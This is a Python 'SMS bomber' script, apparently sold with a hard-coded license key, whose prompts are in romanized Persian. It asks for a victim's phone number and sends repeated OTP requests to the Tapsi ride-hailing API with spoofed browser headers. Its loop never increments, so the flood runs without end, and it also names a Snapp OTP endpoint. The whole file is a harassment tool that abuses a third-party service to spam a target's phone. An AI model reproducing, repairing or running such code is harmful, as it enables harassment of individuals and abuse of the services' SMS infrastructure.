import requests
import time
import os
import sys
from colorama import Fore

api = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"






print(Fore.RED + "\n██████╗ ███████╗██╗   ██╗██╗██╗\n██╔══██╗██╔════╝██║   ██║██║██║\n██║  ██║█████╗  ██║   ██║██║██║\n██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║\n██████╔╝███████╗ ╚████╔╝ ██║███████╗\n╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝\n")
time.sleep(1)

def type(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.05)

def inputkirikhafan(text):
    for i in text:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.05)   
    s = input()
    return s         

type("Welcome To Ariyan,DeviL SMS Bomber\n\n")    

time.sleep(1)

license = inputkirikhafan("Lotfan License Kharidari Shode Ra Vared Konid : ")



def KiriKhafanSnap():
    type("Dar Hal Barresi License . . .")
    time.sleep(0.6)
    if license == "ghazvinboy":
        type("\nLicense Accept Shod\n")
        input1 = inputkirikhafan("Phone Number : ")
        def tapsi(input1):
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0','Accept': '*/*','Accept-Language': 'en-US,en;q=0.5','Content-Type': 'application/json','x-agent': 'v2.2|passenger|WEBAPP|5.7.3||5.0','Origin': 'https://app.tapsi.cab', 'Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-site','Referer': 'https://app.tapsi.cab/','Connection': 'keep-alive',}
            data = {"credential":{"phoneNumber":f"0{input1}","role":"PASSENGER"},"otpOption":"SMS"}
            requests.post('https://api.tapsi.cab/api/v2.2/user', headers=headers, data=data)

        i = 0
        while i < 5:
            tapsi(input1)   

    else:
            
        type("License Vared Shode Sahih Nemibashad !")        

KiriKhafanSnap()       